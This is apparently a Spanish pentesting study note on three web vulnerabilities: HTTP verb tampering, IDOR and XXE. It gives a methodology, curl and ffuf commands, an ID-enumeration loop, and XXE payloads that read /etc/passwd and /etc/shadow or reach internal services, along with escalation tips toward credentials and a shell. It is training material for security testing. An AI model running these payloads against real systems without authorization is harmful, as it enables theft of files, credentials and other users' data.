---
tags:
  - webapp
  - attack
---
## Conceptos Clave (TL;DR)

- Las aplicaciones web son el vector de ataque más común contra empresas, tanto en entornos externos (internet-facing) como internos (intranet/APIs).
- Este módulo cubre tres familias de vulnerabilidades aplicables a cualquier aplicación web: HTTP Verb Tampering, IDOR y XXE Injection.
- Un compromiso de una app web externa puede ser el punto de entrada para pivotar hacia la red interna completa.
- Las APIs externas son igualmente vulnerables a estos ataques y deben incluirse en el scope del pentest.


## Herramientas Clave

- **Burp Suite / curl**: Manipulación de verbos HTTP, interceptación y modificación de peticiones (Verb Tampering).
- **Burp Suite / ffuf / custom scripts**: Enumeración y fuzzing de referencias directas a objetos (IDOR).
- **Burp Suite / xmllint**: Inyección y crafting de payloads XML maliciosos (XXE).


## Metodología Paso a Paso

### Fase 1: Reconocimiento del tipo de aplicacion

1. Identificar si la aplicacion es externa o interna — ambas son igualmente explotables.
2. Determinar si existen endpoints de API en el scope; son candidatos directos para los tres vectores.
3. Mapear las funcionalidades que procesan input del usuario: formularios, uploads, parametros en URL, cabeceras.

### Fase 2: HTTP Verb Tampering

**Logica**: Los servidores web mal configurados aceptan metodos HTTP no estandar (PUT, PATCH, DELETE, OPTIONS, HEAD, etc.). Si los controles de autorizacion o los filtros de seguridad solo validan GET/POST, se pueden eludir enviando la misma peticion con un verbo distinto.

1. Identificar endpoints protegidos o que retornan errores de autorizacion con GET/POST.
2. Reenviar la peticion cambiando el metodo HTTP (HEAD, PUT, PATCH, DELETE, OPTIONS, CONNECT, TRACE).
3. Evaluar si la respuesta cambia (bypass de auth, ejecucion de accion, omision de WAF).

### Fase 3: IDOR (Insecure Direct Object References)

**Logica**: La aplicacion expone referencias directas a recursos (IDs numericos, nombres de archivo, UUIDs) sin validar si el usuario autenticado tiene permiso para acceder a ese recurso especifico. El atacante simplemente enumera o calcula los IDs.

1. Localizar parametros que referencien recursos: `?id=`, `?file=`, `?uid=`, rutas `/api/users/123`.
2. Modificar el valor del parametro (incrementar, decrementar, sustituir por el ID de otro usuario).
3. Verificar si la respuesta devuelve datos de otro usuario/recurso al que no se deberia tener acceso.
4. Automatizar el proceso con ffuf o scripts si el rango es amplio.

### Fase 4: XXE Injection

**Logica**: Las aplicaciones que procesan XML con librerias desactualizadas o mal configuradas pueden ser forzadas a resolver entidades XML externas definidas por el atacante. Esto permite leer archivos locales del servidor, hacer SSRF o incluso ejecutar codigo.

1. Localizar funcionalidades que envien o procesen XML: uploads, endpoints de API con `Content-Type: application/xml`, parsers SOAP.
2. Inyectar una entidad externa en el XML enviado para apuntar a un archivo local sensible.
3. Escalar: leer archivos de configuracion con credenciales, codigo fuente, o usar XXE como vector de SSRF para atacar servicios internos.
4. Si hay RCE disponible via XXE (PHP expect://, etc.), intentar obtener una shell.


## Cheat Sheet de Comandos

### HTTP Verb Tampering

```bash
# Probar diferentes verbos HTTP contra un endpoint protegido con curl
# -X define el metodo HTTP; -I muestra solo cabeceras (util para HEAD)
curl -X OPTIONS http://<TARGET_IP>/admin/ -v
curl -X HEAD http://<TARGET_IP>/admin/ -v
curl -X PUT http://<TARGET_IP>/admin/ -v
curl -X PATCH http://<TARGET_IP>/protected-endpoint -v
```

```bash
# Enviar peticion con verbo no estandar para intentar bypass de autenticacion
# --data envia body; -H establece cabeceras custom
curl -X INVENTED_VERB http://<TARGET_IP>/admin/action -H "Content-Type: application/x-www-form-urlencoded" --data "param=value" -v
```

### IDOR

```bash
# Fuzzing de parametros numericos con ffuf para enumerar IDs de otros usuarios
# -w wordlist de numeros; -u URL con FUZZ como placeholder del ID
ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<TARGET_IP>/api/users/FUZZ -mc 200
```

```bash
# Peticion directa modificando el ID de objeto referenciado
curl -s http://<TARGET_IP>/api/profile?id=<TARGET_USER_ID> -H "Cookie: session=<SESSION_TOKEN>"
```

```bash
# Script bash simple para iterar IDs y volcar respuestas no vacias
for i in $(seq 1 500); do
  result=$(curl -s "http://<TARGET_IP>/api/documents/$i" -H "Cookie: session=<SESSION_TOKEN>")
  echo "$i: $result" | grep -v "not found\|unauthorized" 
done
```

### XXE Injection

```xml
<!-- Payload basico XXE para leer /etc/passwd del servidor -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

```xml
<!-- Payload XXE para leer archivos de configuracion con credenciales -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root><data>&xxe;</data></root>
```

```xml
<!-- Payload XXE para SSRF contra servicios internos -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:<INTERNAL_PORT>/">
]>
<root><data>&xxe;</data></root>
```

```bash
# Enviar payload XXE con curl a un endpoint que procesa XML
# -d @file.xml envia el contenido del archivo como body
curl -s -X POST http://<TARGET_IP>/api/endpoint \
  -H "Content-Type: application/xml" \
  -d @xxe_payload.xml
```

```bash
# Verificar si un endpoint acepta XML cambiando Content-Type
curl -s -X POST http://<TARGET_IP>/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test>probe</test>' -v
```


## "Gotchas" y Troubleshooting

- **Verb Tampering**: No todos los servidores son vulnerables a todos los verbos. El objetivo es encontrar el verbo que NO esta cubierto por el control de acceso o el filtro de seguridad (WAF, input validation). El bypass no siempre da acceso admin; a veces solo omite una validacion de otro ataque (ej. bypass de filtro XSS/SQLi via verbo no esperado).
- **IDOR**: Los IDs no siempre son numericos secuenciales. Pueden ser UUIDs (mas dificiles de bruteforcear), hashes MD5 de emails, o timestamps. Revisar el JWT o cookie de sesion: a veces el ID del usuario esta encoded ahi y se puede modificar directamente.
- **IDOR**: La vulnerabilidad no es solo en GET. Probar IDOR en peticiones POST, PUT y DELETE (ej. borrar o modificar recursos de otro usuario).
- **XXE**: Librerias XML modernas y bien configuradas deshabilitan las entidades externas por defecto (XXE no funciona). Si el parser esta actualizado y no es vulnerable a XXE clasico, intentar variantes: Blind XXE via OOB (out-of-band) con un servidor externo propio, o XXE a traves de XInclude.
- **XXE**: Si el Content-Type de la peticion es `application/json` pero el backend parsea XML internamente, intentar cambiar el Content-Type a `application/xml` y reformatear el body. Algunos endpoints aceptan ambos formatos.
- **XXE**: En contextos de file upload, si la aplicacion acepta SVG, DOCX, XLSX o PDF, estos formatos contienen XML internamente y pueden ser vectores de XXE. Crafting del archivo malicioso y subirlo como si fuera un archivo legitimo.
- **Scope**: Las APIs externas deben tratarse con la misma prioridad que las apps web; son igualmente vulnerables a los tres vectores y suelen tener controles de acceso mas debiles.
- **Escalada**: XXE puede ser el vector inicial para obtener credenciales en archivos de configuracion, lo que lleva a RCE o compromiso total del servidor; no subestimar su impacto.